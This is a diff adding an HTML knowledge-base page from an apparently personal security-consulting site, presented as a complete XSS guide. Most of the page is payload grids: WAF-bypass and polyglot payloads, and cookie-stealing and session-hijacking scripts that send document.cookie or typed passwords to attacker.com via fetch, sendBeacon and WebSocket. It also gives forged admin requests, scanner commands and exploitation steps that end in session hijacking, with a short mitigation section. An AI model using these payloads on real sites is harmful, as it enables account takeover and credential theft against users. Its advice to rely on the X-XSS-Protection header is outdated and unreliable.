@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS | Web Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
+    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
+    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
+    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
+    .logo span { color: var(--primary); }
+    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
+    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--primary); }
+    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
+    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
+    .page-header { padding: 6rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+    .severity-badge { display: inline-block; background: rgba(255, 193, 7, 0.2); color: #ffc107; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .payload-category { margin: 1.5rem 0 1rem; padding: 0.5rem; background: var(--bg-elevated); border-radius: 8px; font-weight: 700; color: var(--primary); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
+    .vulnerability-box { background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    table { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    th, td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+    th { background: var(--bg-elevated); color: var(--primary); }
+    .reference-link { color: var(--primary); text-decoration: none; }
+    @media (max-width: 768px) {
+      .container { padding: 0 1rem; }
+      .mobile-menu { display: block; }
+      .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+      .nav-links.show { display: flex; }
+      .page-header h1 { font-size: 1.8rem; }
+      .payload-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../resume.html">Resume</a></li>
+      <li><a href="../blog.html">Write-ups</a></li>
+      <li><a href="../tools.html">Tools</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / Cross-Site Scripting (XSS)</div>
+    <div class="page-header">
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Medium Severity | OWASP A03:2021</span>
+      <h1>📌 Cross-Site Scripting (XSS)</h1>
+    </div>
+
+    <div class="content-section">
+      <h2>🧠 Description</h2>
+      <p><strong>What is XSS?</strong></p>
+      <p>Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When the victim's browser executes the injected script, it can steal cookies, session tokens, or perform actions on behalf of the user.</p>
+      <p><strong>Types of XSS:</strong></p>
+      <ul>
+        <li><strong>Reflected XSS:</strong> Payload is reflected immediately in the response</li>
+        <li><strong>Stored XSS:</strong> Payload is stored on the server (database, comments, profiles)</li>
+        <li><strong>DOM-based XSS:</strong> Payload executes in the DOM without touching the server</li>
+        <li><strong>Blind XSS:</strong> Payload stored and executed in another context (admin panel)</li>
+        <li><strong>Self XSS:</strong> Requires victim to paste the payload themselves</li>
+      </ul>
+      <p><strong>Security principle violated:</strong> Output Encoding / Input Validation</p>
+    </div>
+
+    <div class="content-section">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Injection</li>
+        <li><strong>OWASP:</strong> A03:2021 – Injection</li>
+        <li><strong>CWE:</strong> CWE-79: Improper Neutralization of Input During Web Page Generation</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ URL parameters (<code>?q=</code>, <code>?search=</code>)</li>
+        <li>✅ POST body (form data, JSON)</li>
+        <li>✅ Headers (User-Agent, Referer, X-Forwarded-For)</li>
+        <li>✅ Cookies</li>
+        <li>✅ File uploads (filename, metadata)</li>
+        <li>✅ JSON/XML responses</li>
+        <li>✅ JavaScript variables</li>
+        <li>✅ HTML attributes</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>💣 Basic Detection Payloads</h2>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=alert(1)&gt;</div>
+        <div class="payload-item">&lt;svg onload=alert(1)&gt;</div>
+        <div class="payload-item">&lt;body onload=alert(1)&gt;</div>
+        <div class="payload-item">&lt;input onfocus=alert(1) autofocus&gt;</div>
+        <div class="payload-item">&lt;details open ontoggle=alert(1)&gt;</div>
+        <div class="payload-item">javascript:alert(1)</div>
+        <div class="payload-item">&lt;iframe src=javascript:alert(1)&gt;</div>
+      </div>
+
+      <div class="payload-category">🎯 Reflected XSS Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;fetch('https://attacker.com?cookie='+document.cookie)&lt;/script&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror="location.href='https://attacker.com?c='+document.cookie"&gt;</div>
+        <div class="payload-item">&lt;svg/onload=alert(1)&gt;</div>
+        <div class="payload-item">&lt;img/src/onerror=alert(1)&gt;</div>
+        <div class="payload-item">&lt;body/onload=alert(1)&gt;</div>
+        <div class="payload-item">&lt;input/onfocus=alert(1)/autofocus&gt;</div>
+        <div class="payload-item">&lt;details/ontoggle=alert(1)&gt;&lt;summary&gt;XSS&lt;/summary&gt;&lt;/details&gt;</div>
+        <div class="payload-item">&lt;video&gt;&lt;source onerror=alert(1)&gt;</div>
+        <div class="payload-item">&lt;audio src onloadstart=alert(1)&gt;</div>
+      </div>
+
+      <div class="payload-category">💾 Stored XSS Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror="alert('Stored XSS')"&gt;</div>
+        <div class="payload-item">&lt;script&gt;new Image().src='https://attacker.com/log?data='+document.cookie&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;fetch('/admin/deleteUser?id=1')&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;document.location='https://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</div>
+      </div>
+
+      <div class="payload-category">🌳 DOM-Based XSS Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">#&lt;img src=x onerror=alert(1)&gt;</div>
+        <div class="payload-item">javascript:alert(1)</div>
+        <div class="payload-item">&lt;svg onload=alert(1)&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=alert(1)&gt;</div>
+        <div class="payload-item">&lt;body onload=alert(1)&gt;</div>
+        <div class="payload-item">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+        <div class="payload-item">'&gt;&lt;img src=x onerror=alert(1)&gt;</div>
+        <div class="payload-item">";alert(1);//</div>
+        <div class="payload-item">'-alert(1)-'</div>
+        <div class="payload-item">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div>
+      </div>
+
+      <div class="payload-category">🛡️ WAF Bypass Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=alert(1)&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=alert(1)//</div>
+        <div class="payload-item">&lt;img src=x onerror=alert(1) x&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=alert`1`&gt;</div>
+        <div class="payload-item">&lt;svg/onload=alert(1)&gt;</div>
+        <div class="payload-item">&lt;svg/onload=alert(1)//</div>
+        <div class="payload-item">&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=eval('al'+'ert(1)')&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=prompt(1)&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=confirm(1)&gt;</div>
+        <div class="payload-item">&lt;iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'&gt;</div>
+        <div class="payload-item">&lt;input type=image src onerror=alert(1)&gt;</div>
+        <div class="payload-item">&lt;b onmouseenter=alert(1)&gt;XSS&lt;/b&gt;</div>
+        <div class="payload-item">&lt;div onmouseover=alert(1)&gt;XSS&lt;/div&gt;</div>
+        <div class="payload-item">'+alert(1)+'</div>
+        <div class="payload-item">\";alert(1);//</div>
+        <div class="payload-item">'-alert(1)-'</div>
+        <div class="payload-item">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror=alert(1) //</div>
+      </div>
+
+      <div class="payload-category">🔄 Polyglot Payloads (Works in Multiple Contexts)</div>
+      <div class="payload-grid">
+        <div class="payload-item">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</div>
+        <div class="payload-item">&lt;svg/onload=alert(1)&gt;</div>
+        <div class="payload-item">javascript:alert(1)</div>
+        <div class="payload-item">&lt;img src=x onerror=alert(1)&gt;</div>
+        <div class="payload-item">";alert(1)//</div>
+        <div class="payload-item">'-alert(1)-'</div>
+        <div class="payload-item">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div>
+      </div>
+
+      <div class="payload-category">🍪 Cookie Stealing Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</div>
+        <div class="payload-item">&lt;img src=x onerror="location.href='https://attacker.com?c='+document.cookie"&gt;</div>
+        <div class="payload-item">&lt;script&gt;new Image().src='https://attacker.com/log?data='+document.cookie&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;document.write('&lt;img src="https://attacker.com/steal?cookie='+document.cookie+'"&gt;')&lt;/script&gt;</div>
+        <div class="payload-item">&lt;svg onload="fetch('https://attacker.com/steal?cookie='+btoa(document.cookie))"&gt;</div>
+      </div>
+
+      <div class="payload-category">🔑 Session Hijacking Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;script&gt;window.location='https://attacker.com/steal?session='+document.cookie&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;navigator.sendBeacon('https://attacker.com/log', document.cookie)&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;const ws=new WebSocket('wss://attacker.com/ws');ws.onopen=()=>ws.send(document.cookie)&lt;/script&gt;</div>
+      </div>
+
+      <div class="payload-category">🐚 Advanced Exploitation Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">&lt;script&gt;fetch('/admin/deleteUser?id=1',{method:'DELETE'})&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;fetch('/api/user',{method:'POST',body:'{"role":"admin"}'})&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked&lt;/h1&gt;&lt;form action=https://attacker.com/steal&gt;&lt;input type=password name=pwd&gt;&lt;input type=submit&gt;&lt;/form&gt;'&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;document.forms[0].action='https://attacker.com/steal'&lt;/script&gt;</div>
+        <div class="payload-item">&lt;script&gt;document.querySelector('input[type=password]').addEventListener('change',function(){fetch('https://attacker.com?p='+this.value)})&lt;/script&gt;</div>
+      </div>
+
+      <div class="payload-category">🔧 XSStrike & Automation Tools</div>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># XSStrike - Advanced XSS detection
+python xsstrike.py -u "https://target.com/page?q=test"
+
+# Dalfox - Fast XSS scanner
+dalfox url "https://target.com/page?q=test"
+
+# XSStrike with POST
+python xsstrike.py -u "https://target.com/login" --data "user=test"
+
+# XSStrike with headers
+python xsstrike.py -u "https://target.com/page?q=test" --headers "Cookie: session=value"
+
+# Finding XSS with FFUF
+ffuf -u "https://target.com/page?q=FUZZ" -w xss-payloads.txt -mr "alert"
+
+# Nuclei XSS template
+nuclei -u "https://target.com" -t ~/nuclei-templates/exposures/configs/xss.yaml</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>🧪 Test Cases</h2>
+      <table>
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Inject <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>No execution</td><td>Alert box appears</td></tr>
+          <tr><td>2</td><td>Inject <code>&lt;img src=x onerror=alert(1)&gt;</code></td><td>No execution</td><td>Alert box appears</td></tr>
+          <tr><td>3</td><td>Inject <code>&lt;svg onload=alert(1)&gt;</code></td><td>No execution</td><td>Alert box appears</td></tr>
+          <tr><td>4</td><td>Inject <code>javascript:alert(1)</code></td><td>No execution</td><td>Alert box appears</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol>
+        <li>Identify injection point (search box, URL parameter, comment form)</li>
+        <li>Inject basic payload (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>)</li>
+        <li>If blocked, try alternative payloads (img, svg, body onload)</li>
+        <li>Test context: HTML, attribute, JavaScript, URL</li>
+        <li>Craft context-specific payload</li>
+        <li>Test WAF bypasses if needed</li>
+        <li>Escalate to cookie stealing or session hijacking</li>
+      </ol>
+    </div>
+
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Output Encoding:</strong> Encode output based on context (HTML, attribute, JavaScript, URL)<br>
+        <strong>✅ Content Security Policy (CSP):</strong> Implement strict CSP to block inline scripts<br>
+        <strong>✅ Input Validation:</strong> Whitelist allowed characters<br>
+        <strong>✅ HttpOnly Flag:</strong> Set HttpOnly flag on cookies<br>
+        <strong>✅ Secure Flag:</strong> Set Secure flag on cookies<br>
+        <strong>✅ X-XSS-Protection:</strong> Use X-XSS-Protection header<br>
+        <strong>✅ Regular Security Audits:</strong> Conduct regular XSS testing
+      </div>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Secure output encoding (PHP)
+htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+
+// JavaScript encoding
+const escapeHtml = (str) => {
+  return str.replace(/[&<>]/g, function(m) {
+    if (m === '&') return '&amp;';
+    if (m === '<') return '&lt;';
+    if (m === '>') return '&gt;';
+    return m;
+  });
+};
+
+// CSP Header
+Content-Security-Policy: default-src 'self'; script-src 'self'</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: Medium to High (depends on context)</strong><br><br>
+        <strong>Impact:</strong>
+        <ul>
+          <li>Cookie/session theft → Account takeover</li>
+          <li>Keylogging</li>
+          <li>Phishing attacks</li>
+          <li>Defacement</li>
+          <li>CSRF bypass</li>
+          <li>Information disclosure</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/xss/" class="reference-link" target="_blank">OWASP: XSS</a></li>
+        <li><a href="https://portswigger.net/web-security/cross-site-scripting" class="reference-link" target="_blank">PortSwigger: XSS</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" class="reference-link" target="_blank">PayloadsAllTheThings: XSS</a></li>
+        <li><a href="https://github.com/coffinxp/payloads/blob/main/xss.txt" class="reference-link" target="_blank">CoffinXP: XSS Payloads</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer><p>Saikumar Raju — Cybersecurity Consultant | XSS - Complete Guide with 150+ Payloads</p></footer>
+
+<script>
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
